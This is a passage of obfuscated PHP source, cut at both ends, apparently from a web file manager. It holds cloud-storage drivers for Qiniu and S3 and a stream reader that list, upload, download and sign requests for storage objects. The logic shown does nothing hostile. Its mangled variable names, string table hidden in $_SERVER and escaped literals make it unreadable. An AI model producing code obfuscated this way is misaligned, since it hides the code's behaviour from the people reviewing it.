(!$É¶–Å„¤) { return !1; } return $this->delFile($Ğ“Àå°„); } private function delByBatch($İ«œ”Ñª) { foreach (array_chunk($İ«œ”Ñª, 1000) as $ËÈ¥½°) { $Úİ÷¨ë = $this->bucketManager->buildBatchDelete($this->bucket, $ËÈ¥½°); list($§“§ÆæÄ, $üĞúåş) = $this->bucketManager->batch($Úİ÷¨ë); if ($üĞúåş) { return !1; } } return !0; } public function rename($Ñ¼ıÓŠƒ, $§·°Á®â) { return $this->renameObject($Ñ¼ıÓŠƒ, $§·°Á®â); } public function fileInfo($åŒïäéŸ, $Ñşß¼Ä€ = false, $ª¢©¬Ì = array()) { $ò¼ìºİ¼ =& $_SERVER[ì™ı‰º¯]; $íÒ¬Ó¬ = array($ò¼ìºİ¼[32] => $this->pathThis($åŒïäéŸ), $ò¼ìºİ¼[84] => $this->getPathOuter($ò¼ìºİ¼[8] . $åŒïäéŸ), $ò¼ìºİ¼[33] => $ò¼ìºİ¼[200], $ò¼ìºİ¼[76] => isset($ª¢©¬Ì[$ò¼ìºİ¼[1438]]) ? $ª¢©¬Ì[$ò¼ìºİ¼[1438]] : 0, $ò¼ìºİ¼[174] => $this->ext($åŒïäéŸ)); if ($Ñşß¼Ä€) { return $íÒ¬Ó¬; } $íÒ¬Ó¬[$ò¼ìºİ¼[201]] = $íÒ¬Ó¬[$ò¼ìºİ¼[85]] = 0; $íÒ¬Ó¬[$ò¼ìºİ¼[202]] = $íÒ¬Ó¬[$ò¼ìºİ¼[203]] = !0; if (empty($ª¢©¬Ì)) { $ª¢©¬Ì = $this->objectMeta($åŒïäéŸ); if (!$ª¢©¬Ì) { return $íÒ¬Ó¬; } } if (isset($ª¢©¬Ì[$ò¼ìºİ¼[1439]])) { $íÒ¬Ó¬[$ò¼ìºİ¼[85]] = substr($ª¢©¬Ì[$ò¼ìºİ¼[1439]] . $ò¼ìºİ¼[12], 0, 10); } if (isset($ª¢©¬Ì[$ò¼ìºİ¼[1438]])) { $íÒ¬Ó¬[$ò¼ìºİ¼[76]] = $ª¢©¬Ì[$ò¼ìºİ¼[1438]]; } return $íÒ¬Ó¬; } public function folderInfo($Ó¿ßäª, $Ç¬ÓÑ¶° = false) { $ŠèàÉ´³ =& $_SERVER[ì™ı‰º¯]; $Êçİ¯ò° = array($ŠèàÉ´³[32] => $this->pathThis($Ó¿ßäª), $ŠèàÉ´³[84] => $this->getPathOuter($ŠèàÉ´³[8] . $Ó¿ßäª), $ŠèàÉ´³[33] => $ŠèàÉ´³[75]); if ($Ç¬ÓÑ¶°) { return $Êçİ¯ò°; } $Êçİ¯ò°[$ŠèàÉ´³[201]] = $Êçİ¯ò°[$ŠèàÉ´³[85]] = 0; $Êçİ¯ò°[$ŠèàÉ´³[202]] = $Êçİ¯ò°[$ŠèàÉ´³[203]] = !0; $Ó¿ßäª = rtrim($Ó¿ßäª, $ŠèàÉ´³[8]) . $ŠèàÉ´³[8]; $¼©éõÅÛ = $this->objectMeta($Ó¿ßäª); if (isset($¼©éõÅÛ[$ŠèàÉ´³[1439]])) { $Êçİ¯ò°[$ŠèàÉ´³[85]] = substr($¼©éõÅÛ[$ŠèàÉ´³[1439]] . $ŠèàÉ´³[12], 0, 10); } return $Êçİ¯ò°; } public function listPath($¬Ñ‚Š¦á, $±‘ÈÓŠæ = false) { $É–•İ¸ =& $_SERVER[ì™ı‰º¯]; $¼Å‹£ˆµ = $this->fileList($¬Ñ‚Š¦á, $É–•İ¸[8], !0); foreach ($¼Å‹£ˆµ[$É–•İ¸[82]] as $¢ÍêÂï· => $’äË—øÅ) { $¼Å‹£ˆµ[$É–•İ¸[82]][$¢ÍêÂï·] = $this->folderInfo($’äË—øÅ, $±‘ÈÓŠæ); } foreach ($¼Å‹£ˆµ[$É–•İ¸[83]] as $¢ÍêÂï· => $’äË—øÅ) { $¼Å‹£ˆµ[$É–•İ¸[83]][$¢ÍêÂï·] = $this->fileInfo($’äË—øÅ[$É–•İ¸[94]], $±‘ÈÓŠæ, $’äË—øÅ); } return $¼Å‹£ˆµ; } public function has($¼Ã£Œ©ó, $ŞÉñâ¦Ã = false, $÷ÁÜ°÷Æ = true) { $ğš¼Ô =& $_SERVER[ì™ı‰º¯]; $¼Ã£Œ©ó = trim($¼Ã£Œ©ó, $ğš¼Ô[8]); $øÀÊ¥Ş© = empty($¼Ã£Œ©ó) && $¼Ã£Œ©ó !== $ğš¼Ô[198] ? $ğš¼Ô[12] : $¼Ã£Œ©ó . $ğš¼Ô[8]; $ÉÖˆ‘Æ = $ğš¼Ô[12]; $–íåôóÑ = 500; $½ÀîÅ«§ = $ğš¼Ô[8]; $¢’ûÎí• = $Ìµ¸©­– = 0; while (!0) { check_abort(); list($¥±ıÅïƒ, $¾œä—âÄ) = $this->bucketManager->listFiles($this->bucket, $øÀÊ¥Ş©, $ÉÖˆ‘Æ, $–íåôóÑ, $½ÀîÅ«§); if ($¾œä—âÄ) { break; } $ÉÖˆ‘Æ = array_key_exists($ğš¼Ô[1407], $¥±ıÅïƒ) ? $ÉÖˆ‘Æ = $¥±ıÅïƒ[$ğš¼Ô[1440]] : $ğš¼Ô[12]; if ($ŞÉñâ¦Ã) { if (!empty($¥±ıÅïƒ[$ğš¼Ô[1441]])) { $¢’ûÎí• += count($¥±ıÅïƒ[$ğš¼Ô[1441]]); } if (!empty($¥±ıÅïƒ[$ğš¼Ô[1442]])) { $Ìµ¸©­– += count($¥±ıÅïƒ[$ğš¼Ô[1442]]); } if ($ÉÖˆ‘Æ === $ğš¼Ô[12]) { break; } continue; } if ($÷ÁÜ°÷Æ) { if (!empty($¥±ıÅïƒ[$ğš¼Ô[1441]])) { return !0; } } else { if (!empty($¥±ıÅïƒ[$ğš¼Ô[1442]])) { return !0; } } if ($ÉÖˆ‘Æ === $ğš¼Ô[12]) { break; } } if ($ŞÉñâ¦Ã) { return array($ğš¼Ô[207] => $¢’ûÎí•, $ğš¼Ô[208] => $Ìµ¸©­–); } return !1; } public function listAll($ÛÈ”ã¤–) { $œ•ùµ˜ =& $_SERVER[ì™ı‰º¯]; $Ì÷ÌáÀ = $this->fileList($ÛÈ”ã¤–, $œ•ùµ˜[12], !0); $ŞºÉ¤¡ˆ = array_to_keyvalue($Ì÷ÌáÀ[$œ•ùµ˜[83]], $œ•ùµ˜[32]); foreach ($Ì÷ÌáÀ[$œ•ùµ˜[82]] as $Š¬µÑüÆ) { if (is_string($Š¬µÑüÆ)) { $ŞºÉ¤¡ˆ[$Š¬µÑüÆ] = array($œ•ùµ˜[76] => 0); } } return $this->listAllFiles($ÛÈ”ã¤–, $ŞºÉ¤¡ˆ); } private function fileList($éøîñ«ï, $çöÓ´ó‹ = '', $Ï““¬»Ú = 0) { $¬”ì…ÁÊ =& $_SERVER[ì™ı‰º¯]; $éøîñ«ï = trim($éøîñ«ï, $¬”ì…ÁÊ[8]); $÷ª…·„Ë = empty($éøîñ«ï) && $éøîñ«ï !== $¬”ì…ÁÊ[198] ? $¬”ì…ÁÊ[12] : $éøîñ«ï . $¬”ì…ÁÊ[8]; $ßé°Ô¾ = $¬”ì…ÁÊ[12]; $­ÖÒ“¼± = 1000; $”õ¿ÙÔº = $ú‡¶°İÔ = array(); while (!0) { check_abort(); list($ş¿·´¨Ê, $Å¡áĞ¬¶) = $this->bucketManager->listFiles($this->bucket, $÷ª…·„Ë, $ßé°Ô¾, $­ÖÒ“¼±, $çöÓ´ó‹); if ($Å¡áĞ¬¶) { break; } $ßé°Ô¾ = array_key_exists($¬”ì…ÁÊ[1407], $ş¿·´¨Ê) ? $ßé°Ô¾ = $ş¿·´¨Ê[$¬”ì…ÁÊ[1440]] : $¬”ì…ÁÊ[12]; $ß“·û¥ê = isset($ş¿·´¨Ê[$¬”ì…ÁÊ[1441]]) ? $ş¿·´¨Ê[$¬”ì…ÁÊ[1441]] : array(); $êÇ¼°‘ = isset($ş¿·´¨Ê[$¬”ì…ÁÊ[1442]]) ? $ş¿·´¨Ê[$¬”ì…ÁÊ[1442]] : array(); foreach ($ß“·û¥ê as $¬µ¹ÖÎ¾) { if ($¬µ¹ÖÎ¾[$¬”ì…ÁÊ[94]] == $÷ª…·„Ë) { continue; } $şÅˆİØÄ = $¬µ¹ÖÎ¾[$¬”ì…ÁÊ[94]]; $ı¾”ñâÚ = $¬µ¹ÖÎ¾[$¬”ì…ÁÊ[1438]]; $¬µ¹ÖÎ¾[$¬”ì…ÁÊ[76]] = $ı¾”ñâÚ; $´¶ç˜ = $ı¾”ñâÚ == 0 && substr($şÅˆİØÄ, strlen($şÅˆİØÄ) - 1, 1) == $¬”ì…ÁÊ[8] ? !0 : !1; $this->cacheMethodInfoSet($şÅˆİØÄ, $´¶ç˜, $¬µ¹ÖÎ¾); if ($´¶ç˜) { $”õ¿ÙÔº[] = $şÅˆİØÄ; continue; } $ú‡¶°İÔ[] = $Ï““¬»Ú ? $¬µ¹ÖÎ¾ : $şÅˆİØÄ; } foreach ($êÇ¼°‘ as $şÅˆİØÄ) { if ($şÅˆİØÄ == $÷ª…·„Ë) { continue; } $”õ¿ÙÔº[] = $şÅˆİØÄ; $this->cacheMethodInfoSet($şÅˆİØÄ, !0); } if ($ßé°Ô¾ === $¬”ì…ÁÊ[12]) { break; } } $this->cacheMethodInfoSet($éøîñ«ï, !0); return array($¬”ì…ÁÊ[82] => $”õ¿ÙÔº, $¬”ì…ÁÊ[83] => $ú‡¶°İÔ); } public function canRead($ Å¯æ) { return $this->exist($ Å¯æ) ? !0 : !1; } public function canWrite($¸…âç«©) { return $this->exist($¸…âç«©) ? !0 : !1; } public function getContent($í«ûú¹½) { return $this->fileSubstr($í«ûú¹½, 0, -1); } public function setContent($œÉï³², $Ò‹à¾ü² = '') { $ıÉäã»û = $this->tempFile($this->pathThis($œÉï³²)); file_put_contents($ıÉäã»û, $Ò‹à¾ü²); if ($this->upload($œÉï³², $ıÉäã»û)) { $this->tempFileRemve($ıÉäã»û); return !0; } return !1; } public function refreshUrls($»äŠœÓ) { $æÊø£…£ =& $_SERVER[ì™ı‰º¯]; $¯ı•”æ‘ = array(); if (is_array($»äŠœÓ)) { foreach ($»äŠœÓ as $íã™ÓÄÂ) { $¯ı•”æ‘[] = $this->link($íã™ÓÄÂ); } } else { $¯ı•”æ‘[] = $this->link($»äŠœÓ); } $æ¶â‚‚Œ = new Qiniu\Cdn\CdnManager($this->auth); list($Ô¡ÀçÚ£, $üŞ‚êîÁ) = $æ¶â‚‚Œ->refreshUrls($¯ı•”æ‘); if ($üŞ‚êîÁ) { return !1; } return $Ô¡ÀçÚ£[$æÊø£…£[1181]] == $æÊø£…£[755] ? !0 : !1; } public function fileSubstr($’Ğ³åòÈ, $Öè¤»Å¡, $ç‚’™¾©) { $äË½ÍÁ =& $_SERVER[ì™ı‰º¯]; if (!($Ş•Ä–²Å = $this->link($’Ğ³åòÈ))) { return !1; } $±‡ËßœÇ = !1; if ($ç‚’™¾© > 0) { $šÚç› = $Öè¤»Å¡ + $ç‚’™¾© - 1; $±‡ËßœÇ = array($äË½ÍÁ[1443] . $Öè¤»Å¡ . $äË½ÍÁ[386] . $šÚç›); } $Äà¦¡òÏ = url_request($Ş•Ä–²Å, $äË½ÍÁ[230], !1, $±‡ËßœÇ); return $Äà¦¡òÏ[$äË½ÍÁ[745]] ? $Äà¦¡òÏ[$äË½ÍÁ[1201]] : !1; } public function upload($ª¤˜¼Ø, $«ĞóÓ¡¾, $ı’¸×é = false, $±Ò·°û = REPEAT_REPLACE) { $é¹Ò•ÜŞ = new Qiniu\Storage\UploadManager(); $­äû™°Ê = $this->auth->uploadToken($this->bucket, $ª¤˜¼Ø); $ÙÏÜÙµ› = get_file_mime(get_path_ext($«ĞóÓ¡¾)); list($÷ÛàÚ¤¾, $æÆ¯ÍõÛ) = $é¹Ò•ÜŞ->putFile($­äû™°Ê, $ª¤˜¼Ø, $«ĞóÓ¡¾, null, $ÙÏÜÙµ›); return $æÆ¯ÍõÛ ? !1 : $this->getPathOuter($ª¤˜¼Ø); } public function uploadFormData($É’Àˆñç, $š£¾¥ı = 3600) { return $this->uploadToken($É’Àˆñç, $š£¾¥ı); } public function multiUploadFormData($«¸¬Š¿³, $Ëˆ°Ù„ = 3600) { return $this->uploadToken($«¸¬Š¿³, $Ëˆ°Ù„); } private function uploadToken($ú«ä¼Ğ˜, $Œ¾ï‰ = 3600) { $Üµˆ¦Øû =& $_SERVER[ì™ı‰º¯]; $íñÛ£îš = $Œ¾ï‰; $”òÚ šì = array($Üµˆ¦Øû[1444] => $Üµˆ¦Øû[1445]); $ÛÖÆ“·¬ = $ú«ä¼Ğ˜; $„ˆËø— = $this->auth->uploadToken($this->bucket, $ÛÖÆ“·¬, $íñÛ£îš, $”òÚ šì, !0); $ÙÉ¸ÙûÄ = empty($this->region) || $this->region == $Üµˆ¦Øû[1446] ? $Üµˆ¦Øû[12] : $Üµˆ¦Øû[386] . $this->region; $×‹³€“ = http_type() . "\x3a\57\x2f\x75\160\154\157\x61\144{$ÙÉ¸ÙûÄ}\x2e\x71\x69\x6e\x69\x75\160\56\143\x6f\155\57"; return array($Üµˆ¦Øû[1447] => $„ˆËø—, $Üµˆ¦Øû[1448] => $×‹³€“); } public function download($–şÑ‘¿, $Œ¸…ŠÇ®) { $ö‡§ıĞ¯ = IO::getPathInner(IO::mkfile($Œ¸…ŠÇ®)); if (!($’¤‡ØÕ = $this->link($–şÑ‘¿))) { return !1; } $”Ì¯Ï£Ê = 0; $è‘¤İöÃ = 1024 * 200; $Ã÷Ÿ±óû = fopen($ö‡§ıĞ¯, $_SERVER[ì™ı‰º¯][1449]); while (!0) { $¤Ôì©² = $this->fileSubstr($–şÑ‘¿, $”Ì¯Ï£Ê, $è‘¤İöÃ); if ($¤Ôì©² === !1) { return !1; } fwrite($Ã÷Ÿ±óû, $¤Ôì©²); $”Ì¯Ï£Ê += $è‘¤İöÃ; if (strlen($¤Ôì©²) < $è‘¤İöÃ) { break; } } fclose($Ã÷Ÿ±óû); return $Œ¸…ŠÇ®; } public function link($ìÍüæÑÌ, $óÏéÃ×Ô = '') { if (!$this->isFile($ìÍüæÑÌ)) { return !1; } $å–ø¸ö = $this->getHost() . $_SERVER[ì™ı‰º¯][8] . $this->pathEncode($ìÍüæÑÌ) . $óÏéÃ×Ô; return $this->auth->privateDownloadUrl($å–ø¸ö, 3600 * 12); } public function fileOut($á«™ªîÍ, $£©è·¼£ = false, $¹ƒõıŒş = false, $É£”èâÜ = '') { $öò†Èèş =& $_SERVER[ì™ı‰º¯]; if ($this->isFileOutServer()) { return $this->fileOutServer($á«™ªîÍ, $£©è·¼£, $¹ƒõıŒş, $É£”èâÜ); } if (!$¹ƒõıŒş) { $¹ƒõıŒş = $this->pathThis($á«™ªîÍ); } $…›‡ğ†ß = $£©è·¼£ ? $öò†Èèş[1450] . rawurlencode($¹ƒõıŒş) : $öò†Èèş[12]; $Ê„İŞÁÄ = $this->link($á«™ªîÍ, $…›‡ğ†ß); $this->fileOutLink($Ê„İŞÁÄ); } public function fileOutServer($®—×ê³±, $ŠÕ¯Ì¨î = false, $ÚüšÉµË = false, $Ô“Ô»´‹ = '') { parent::fileOut($®—×ê³±, $ŠÕ¯Ì¨î, $ÚüšÉµË, $Ô“Ô»´‹); } public function fileOutImage($ßêò¨ÕÍ, $•Å¹Ÿ€— = 250) { $ÂÀÏ‰¹Õ = $this->link($ßêò¨ÕÍ, $_SERVER[ì™ı‰º¯][1451] . $•Å¹Ÿ€—); $this->fileOutLink($ÂÀÏ‰¹Õ); } public function fileOutImageServer($÷ŞíË‹¼, $÷¦È¡ÎÖ = 250) { parent::fileOutImage($÷ŞíË‹¼, $÷¦È¡ÎÖ); } public function hashMd5($àÉÜŒÍ) { $éçÕ­Œá =& $_SERVER[ì™ı‰º¯]; $Ñ¢íƒ¢“ = $this->objectMeta($àÉÜŒÍ); return isset($Ñ¢íƒ¢“[$éçÕ­Œá[212]]) ? $Ñ¢íƒ¢“[$éçÕ­Œá[212]] : !1; $É¦ÌÉœ = $this->link($àÉÜŒÍ, $éçÕ­Œá[1452]); } public function size($ÆÏğŒá¼) { $©“ŒšÅ = $this->objectMeta($ÆÏğŒá¼); return $©“ŒšÅ ? $©“ŒšÅ[$_SERVER[ì™ı‰º¯][76]] : 0; } public function info($¡İ­×¶³) { if ($this->isFolder($¡İ­×¶³)) { return $this->folderInfo($¡İ­×¶³); } else { if ($this->isFile($¡İ­×¶³)) { return $this->fileInfo($¡İ­×¶³); } } return !1; } public function exist($ŠÕ¡šÆ) { return $this->isFile($ŠÕ¡šÆ) || $this->isFolder($ŠÕ¡šÆ); } public function isFile($œæ¯ü¨ô) { return !$this->isFolder($œæ¯ü¨ô) && $this->objectMeta($œæ¯ü¨ô); } public function isFolder($®É¥Î°) { return $this->cacheMethod($_SERVER[ì™ı‰º¯][165], $®É¥Î°); } protected function objectMeta($åÇóıö³) { return $this->cacheMethod($_SERVER[ì™ı‰º¯][167], $åÇóıö³); } protected function _objectMeta($éâ±ÌÖî) { $°”•òŞ£ =& $_SERVER[ì™ı‰º¯]; list($–£„á ©, $Ü–Ã±ö) = $this->bucketManager->stat($this->bucket, $éâ±ÌÖî); if ($–£„á ©) { $–£„á ©[$°”•òŞ£[76]] = intval($–£„á ©[$°”•òŞ£[1438]]); } return $–£„á ©; } protected function _isFolder($‚¹¯¡ßñ) { $³»’ìœŠ =& $_SERVER[ì™ı‰º¯]; if ($‚¹¯¡ßñ == $³»’ìœŠ[12] || $‚¹¯¡ßñ == $³»’ìœŠ[8]) { return !0; } list($ğûîĞ†ğ, $¯¯‡â÷) = $this->bucketManager->listFiles($this->bucket, trim($‚¹¯¡ßñ, $³»’ìœŠ[8]) . $³»’ìœŠ[8], $³»’ìœŠ[12], 1, $³»’ìœŠ[8]); return !empty($ğûîĞ†ğ[$³»’ìœŠ[1441]]) || !empty($ğûîĞ†ğ[$³»’ìœŠ[1442]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($şôÔ‹ÖÄ) { parent::__construct($şôÔ‹ÖÄ); } public function uploadFormData($Ó’½ñ›–, $†ÊÏ¯ = 3600) { $öŒçüÆ‘ =& $_SERVER[ì™ı‰º¯]; $©ç‰´© = $öŒçüÆ‘[199]; $•ø×ç§± = $öŒçüÆ‘[1357]; $¡õùÆÈ = $öŒçüÆ‘[62]; $š¤™Şò = gmdate($öŒçüÆ‘[1358]); $³…¦ØÁ” = gmdate($öŒçüÆ‘[746]); $’…ş©Ô¯ = $öŒçüÆ‘[1359]; $¶ï¡®¸à = $†ÊÏ¯ . $öŒçüÆ‘[12]; $¡¨ø™ûÍ = $öŒçüÆ‘[1321]; $Ó¢ßµ  = array($this->accessKey, $³…¦ØÁ”, $this->region, $¡õùÆÈ, $’…ş©Ô¯); $Ë¢¤Ê´™ = implode($öŒçüÆ‘[8], $Ó¢ßµ ); $­úáÇÅ = array($öŒçüÆ‘[1323] => gmdate($öŒçüÆ‘[1322], strtotime($öŒçüÆ‘[1360])), $öŒçüÆ‘[1324] => array(array($öŒçüÆ‘[1326] => $this->bucket), array($öŒçüÆ‘[1325] => $©ç‰´©), array($öŒçüÆ‘[1327], $öŒçüÆ‘[1328], $öŒçüÆ‘[12]), array($öŒçüÆ‘[1327], $öŒçüÆ‘[1361], $öŒçüÆ‘[12]), array($öŒçüÆ‘[1327], $öŒçüÆ‘[1362], $öŒçüÆ‘[12]), array($öŒçüÆ‘[1329] => $¡¨ø™ûÍ), array($öŒçüÆ‘[1363] => $Ë¢¤Ê´™), array($öŒçüÆ‘[1364] => $•ø×ç§±), array($öŒçüÆ‘[1365] => $š¤™Şò), array($öŒçüÆ‘[1366] => $¶ï¡®¸à))); $¡ÙºÁ–¯ = base64_encode(json_encode($­úáÇÅ)); $‰€ŸÒóğ = hash_hmac($öŒçüÆ‘[1367], $³…¦ØÁ”, $öŒçüÆ‘[1368] . $this->secret, !0); $âçÃ÷Øü = hash_hmac($öŒçüÆ‘[1367], $this->region, $‰€ŸÒóğ, !0); $íË²ãÛª = hash_hmac($öŒçüÆ‘[1367], $¡õùÆÈ, $âçÃ÷Øü, !0); $ÖÌÅ÷ã¢ = hash_hmac($öŒçüÆ‘[1367], $’…ş©Ô¯, $íË²ãÛª, !0); $Ï»¾œãü = hash_hmac($öŒçüÆ‘[1367], $¡ÙºÁ–¯, $ÖÌÅ÷ã¢); $ººÖ¤ıİ = array($öŒçüÆ‘[215] => $öŒçüÆ‘[12], $öŒçüÆ‘[1369] => $öŒçüÆ‘[12], $öŒçüÆ‘[1325] => $©ç‰´©, $öŒçüÆ‘[1329] => $¡¨ø™ûÍ, $öŒçüÆ‘[1333] => $¡ÙºÁ–¯, $öŒçüÆ‘[1370] => $Ë¢¤Ê´™, $öŒçüÆ‘[1371] => $•ø×ç§±, $öŒçüÆ‘[1372] => $š¤™Şò, $öŒçüÆ‘[1373] => $¶ï¡®¸à, $öŒçüÆ‘[1374] => $Ï»¾œãü, $öŒçüÆ‘[182] => $this->getHost()); return $ººÖ¤ıİ; } public function multiUploadFormData($Ö½ßø, $Á¸ç°ñÅ = 3600) { $¿—Ï– ¿ =& $_SERVER[ì™ı‰º¯]; $Ô¤Éô¿Ã = gmdate($¿—Ï– ¿[1453]); $¨–ò˜ = array(); $¼­è£ñ¤ = $this->client->getUploadId($this->bucket, $Ö½ßø, $¨–ò˜); if (!$¼­è£ñ¤) { return !1; } return array($¿—Ï– ¿[223] => $¼­è£ñ¤, $¿—Ï– ¿[182] => $this->getHost() . $¿—Ï– ¿[8] . $this->pathEncode($Ö½ßø), $¿—Ï– ¿[224] => $Ô¤Éô¿Ã, $¿—Ï– ¿[94] => $Ö½ßø); } public function multiUploadAuthData($™›ÑÂŠï, $¯Ÿ¬Îúğ = array()) { $òÅ‹ˆ±‡ =& $_SERVER[ì™ı‰º¯]; $£èäĞÚ­ = isset($¯Ÿ¬Îúğ[$òÅ‹ˆ±‡[174]]) ? $¯Ÿ¬Îúğ[$òÅ‹ˆ±‡[174]] : $òÅ‹ˆ±‡[12]; $ÓÏÔäªó = $¯Ÿ¬Îúğ[$òÅ‹ˆ±‡[94]]; unset($¯Ÿ¬Îúğ[$òÅ‹ˆ±‡[94]]); if (isset($¯Ÿ¬Îúğ[$òÅ‹ˆ±‡[225]])) { return $this->listUploadParts($ÓÏÔäªó, $¯Ÿ¬Îúğ); } $Õ«è¥ = array(); if (isset($¯Ÿ¬Îúğ[$òÅ‹ˆ±‡[1454]])) { $Õ«è¥[$òÅ‹ˆ±‡[1455]] = $¯Ÿ¬Îúğ[$òÅ‹ˆ±‡[1454]]; } $Íê£¥‹é = explode($òÅ‹ˆ±‡[184], $this->getHost()); $óøƒ…õÍ = array($òÅ‹ˆ±‡[1456] => $Íê£¥‹é[1], $òÅ‹ˆ±‡[1457] => $òÅ‹ˆ±‡[12], $òÅ‹ˆ±‡[215] => $òÅ‹ˆ±‡[120], $òÅ‹ˆ±‡[1369] => $¯Ÿ¬Îúğ[$òÅ‹ˆ±‡[76]]); $ÙÌ§­£õ = $òÅ‹ˆ±‡[228]; $ÏØ±ãß = $òÅ‹ˆ±‡[8] . $this->pathEncode($ÓÏÔäªó) . $£èäĞÚ­; $®Ğˆë = $this->client->__getSignatureV4($Õ«è¥, $óøƒ…õÍ, $ÙÌ§­£õ, $ÏØ±ãß); if (strpos($£èäĞÚ­, $òÅ‹ˆ±‡[227]) === 0) { if (isset($Õ«è¥[$òÅ‹ˆ±‡[1455]])) { $ĞÍº˜· = $Õ«è¥[$òÅ‹ˆ±‡[1455]]; } else { if (isset($®Ğˆë[$òÅ‹ˆ±‡[1455]])) { $ĞÍº˜· = $®Ğˆë[$òÅ‹ˆ±‡[1455]]; } else { $ĞÍº˜· = hash($òÅ‹ˆ±‡[1367], $òÅ‹ˆ±‡[12]); } } return array($òÅ‹ˆ±‡[234] => $®Ğˆë[$òÅ‹ˆ±‡[234]], $òÅ‹ˆ±‡[1455] => $ĞÍº˜·, $òÅ‹ˆ±‡[224] => $®Ğˆë[$òÅ‹ˆ±‡[1458]]); } return $®Ğˆë[$òÅ‹ˆ±‡[234]]; } public function listUploadParts($û¹ßÏĞÂ, $…óİ×Ğ = array()) { $šºİ¸¬ê =& $_SERVER[ì™ı‰º¯]; $èšöª»— = str_replace($šºİ¸¬ê[235], $šºİ¸¬ê[12], $…óİ×Ğ[$šºİ¸¬ê[174]]); $ã˜â¬Şã = $this->client->listParts($this->bucket, $û¹ßÏĞÂ, $èšöª»—); if (!$ã˜â¬Şã) { return !1; } $¥¢áãæ = $šºİ¸¬ê[1459]; foreach ($ã˜â¬Şã as $ôÔ¡ğ) { $¥¢áãæ .= $šºİ¸¬ê[1460] . "\74\120\141\162\164\116\165\155\142\x65\162\x3e{$ôÔ¡ğ[$šºİ¸¬ê[1414]]}\x3c\x2f\x50\x61\x72\164\x4e\165\155\x62\145\x72\x3e\12" . "\x3c\x45\x54\141\147\76{$ôÔ¡ğ[$šºİ¸¬ê[1415]]}\x3c\57\x45\124\x61\x67\76\12" . $šºİ¸¬ê[1461]; } $¥¢áãæ .= $šºİ¸¬ê[1462]; $“òÇ‹ò¥ = array(); $“”˜‘ƒÑ = explode($šºİ¸¬ê[184], $this->getHost()); $òîñ¿û = array($šºİ¸¬ê[1456] => $“”˜‘ƒÑ[1], $šºİ¸¬ê[215] => $šºİ¸¬ê[120], $šºİ¸¬ê[1369] => strlen($¥¢áãæ)); $ÚºØŠĞ˜ = $šºİ¸¬ê[226]; $®à¡²Òê = $šºİ¸¬ê[8] . $this->pathEncode($û¹ßÏĞÂ) . $…óİ×Ğ[$šºİ¸¬ê[174]]; $»Ù‹Œúò = $this->client->__getSignatureV4($“òÇ‹ò¥, $òîñ¿û, $ÚºØŠĞ˜, $®à¡²Òê, $¥¢áãæ); return array($šºİ¸¬ê[234] => $»Ù‹Œúò[$šºİ¸¬ê[234]], $šºİ¸¬ê[224] => $»Ù‹Œúò[$šºİ¸¬ê[1458]], $šºİ¸¬ê[236] => $ã˜â¬Şã, $šºİ¸¬ê[1455] => $»Ù‹Œúò[$šºİ¸¬ê[1455]]); } public function link($Àƒ”´øŞ, $øˆÙßÇ‰ = array()) { return parent::link($Àƒ”´øŞ, $øˆÙßÇ‰); } public function fileOut($÷ƒšçœò, $Ï‘Ù¢Èõ = false, $˜¤€¼Ê¾ = false, $ÂËÎŒƒè = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[ì™ı‰º¯][1463])) { return parent::fileOutServer($÷ƒšçœò, $Ï‘Ù¢Èõ, $˜¤€¼Ê¾, $ÂËÎŒƒè); } parent::fileOut($÷ƒšçœò, $Ï‘Ù¢Èõ, $˜¤€¼Ê¾, $ÂËÎŒƒè); } public function fileOutImage($¾ˆ‰„Úö, $Ô ™æâÊ = 250) { if (strstr($this->endpoint, $_SERVER[ì™ı‰º¯][1463])) { return parent::fileOutImageServer($¾ˆ‰„Úö, $Ô ™æâÊ); } parent::fileOutImage($¾ˆ‰„Úö, $Ô ™æâÊ); } public function fileOutLink($èìÊÈšú) { $½şŠÌ˜¤ =& $_SERVER[ì™ı‰º¯]; if (substr($èìÊÈšú, 0, 7) == $½şŠÌ˜¤[1336]) { $èìÊÈšú = $½şŠÌ˜¤[1337] . substr($èìÊÈšú, 7); } header($½şŠÌ˜¤[161] . $èìÊÈšú); die; } public function getHost() { $«¦ÇŞš§ =& $_SERVER[ì™ı‰º¯]; $ÏŠšÂ÷ = str_rtrim(parent::getHost(), $«¦ÇŞš§[8] . $this->bucket); $ÏŠšÂ÷ = explode($«¦ÇŞš§[184], $ÏŠšÂ÷); return $ÏŠšÂ÷[0] . $«¦ÇŞš§[184] . $this->bucket . $«¦ÇŞš§[10] . $ÏŠšÂ÷[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($«÷¬ˆéÔ, $¡°¾ˆ–è = 0) { parent::__construct(); $this->source = $«÷¬ˆéÔ; $this->sourceSize = $¡°¾ˆ–è; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($Í¬üîàœ = false) { return $this->sourceSize; } public function getContent($§×¿äÃú = false) { return $this->fileSubstr($§×¿äÃú, 0, $this->sourceSize); } public function fileSubstr($ØŒ±Ä¼ = false, $¼äƒ‡–² = 0, $¹Ì ñÆ = 0) { if (!$¹Ì ñÆ) { $¹Ì ñÆ = $this->sourceSize; } $‚¿Ö¼„è = $this->sourceSize - $¼äƒ‡–²; if ($¹Ì ñÆ >= $‚¿Ö¼„è) { $¹Ì ñÆ = $‚¿Ö¼„è; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $¼äƒ‡–², $¹Ì ñÆ); } if ($this->sourceType == self::TYPE_FILE) { if ($¹Ì ñÆ <= 0) { return $_SERVER[ì™ı‰º¯][12]; } $òíÆ‡£ = ftell($this->source); fseek_64($this->source, $òíÆ‡£ + $¼äƒ‡–²); $šù—èğ = @fread($this->source, $¹Ì ñÆ); fseek_64($this->source, $òíÆ‡£); return $šù—èğ; } } public function hashMd5($—¢ªç‘Å = false) { return md5($this->getContent()); } public static function hash($²¤¦¬ä¿, $ÌÜ·Æä— = 0) { $¸Å²ığû = new PathDriverStream($²¤¦¬ä¿, $ÌÜ·Æä—); return $¸Å²ığû->hashSimple($²¤¦¬ä¿); } public static function md5($ûˆâ¢ìû, $çÂ»ìÁë = 0) { $ğÚ¥áµ± = new PathDriverStream($ûˆâ¢ìû, $çÂ»ìÁë); return $ğÚ¥áµ±->hashMd5($ûˆâ¢ìû); } } goto eÉªòæì‹; AùĞ¸Ã ¸à: class TaskRun { private static 